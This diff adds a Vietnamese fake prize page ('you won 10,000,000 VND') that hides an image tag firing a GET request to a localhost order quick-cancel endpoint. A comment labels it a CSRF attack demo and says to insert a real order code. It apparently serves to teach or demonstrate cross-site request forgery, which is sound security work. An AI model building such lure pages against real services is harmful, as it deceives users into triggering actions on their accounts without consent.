@@ -1,0 +1,39 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Chúc mừng! Bạn trúng thưởng!</title>
+    <style>
+      body {
+        font-family: Arial;
+        text-align: center;
+        padding: 50px;
+        background: #fff3e0;
+      }
+      h1 {
+        color: #e65100;
+        font-size: 36px;
+      }
+      p {
+        font-size: 18px;
+        color: #333;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>🎉 Xin chúc mừng! Bạn đã trúng 10.000.000 VNĐ!</h1>
+    <p>Phần thưởng đang được xử lý, vui lòng chờ...</p>
+    <p style="color: #999; font-size: 12px">
+      Trang này sẽ tự động đóng sau 10 giây.
+    </p>
+
+    <!-- 
+    CSRF ATTACK: Thẻ img ẩn tự động gửi GET request đến server
+    Thay GN17462389009999 bằng mã đơn hàng thật để demo
+  -->
+    <img
+      src="http://localhost:5001/api/orders/GN79018553276424/quick-cancel"
+      style="display: none"
+      onerror="console.log('CSRF request sent!')"
+    />
+  </body>
+</html>
